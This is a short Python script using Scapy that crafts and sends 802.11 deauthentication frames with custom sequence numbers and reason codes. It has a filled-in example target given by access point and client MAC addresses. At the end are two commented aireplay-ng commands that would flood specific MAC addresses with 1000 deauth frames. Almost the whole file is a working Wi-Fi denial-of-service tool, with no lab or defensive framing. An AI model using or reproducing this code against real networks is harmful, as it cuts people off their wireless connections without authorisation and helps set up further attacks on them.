from scapy.all import *

def send_deauth_packet_with_sn(ap_bssid, client_mac, interface, reason_code, start_sn, count):
    """
    Send custom deauthentication packets with an incrementing sequence number (SN).

    Args:
        ap_bssid (str): MAC address of the Access Point.
        client_mac (str): MAC address of the target client.
        interface (str): Wireless interface in monitor mode.
        reason_code (int): Custom reason code for the deauth packet.
        start_sn (int): Starting sequence number.
        count (int): Number of deauth packets to send.
    """
    for sn in range(start_sn, start_sn + count):
        # Craft deauthentication frame
        dot11 = Dot11(
            addr1=client_mac,  # Target client
            addr2=ap_bssid,    # AP MAC
            addr3=ap_bssid,    # AP MAC
            type=0,            # Management frame
            subtype=12,        # Deauthentication subtype
            SC=sn << 4         # Set the sequence number (shifted left by 4 bits for the SC field)
        )
        deauth = Dot11Deauth(reason=reason_code)

        # Combine layers
        packet = RadioTap() / dot11 / deauth

        print(f"Sending deauth packet with SN={sn}, Reason Code={reason_code}")
        
        # Send the packet
        sendp(packet, iface=interface, verbose=0)

# Example Usage
if __name__ == "__main__":
    ap_bssid = "D8:EC:5E:F7:CD:03"   # Replace with AP MAC
    client_mac = "5c:ba:ef:5c:51:db"  # Replace with client MAC
    interface = "wlan0"               # Replace with monitor mode interface
    reason_code = 3                   # Custom Reason Code
    start_sn = 1                      # Starting sequence number
    count = 1                       # Number of packets to send

    send_deauth_packet_with_sn(ap_bssid, client_mac, interface, reason_code, start_sn, count)


# sudo aireplay-ng --deauth 1000 -a D8:EC:5E:F6:F7:AF -c 5c:ba:ef:5c:51:db wlan1
# sudo aireplay-ng --deauth 1000 -a D8:EC:5E:F7:CD:03 -c 5c:ba:ef:5c:51:db wlan1
